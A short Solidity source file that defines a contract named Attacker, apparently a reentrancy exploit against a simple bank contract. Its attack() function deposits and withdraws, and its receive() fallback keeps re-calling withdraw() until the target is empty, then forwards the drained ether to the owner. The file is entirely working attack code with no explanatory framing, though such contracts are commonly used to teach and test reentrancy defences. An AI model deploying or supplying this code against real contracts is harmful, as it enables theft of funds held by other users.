// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;
    
    constructor(address _bankAddress, address _initialOwner) Ownable(_initialOwner) {
        bank = IBank(_bankAddress);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();   
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}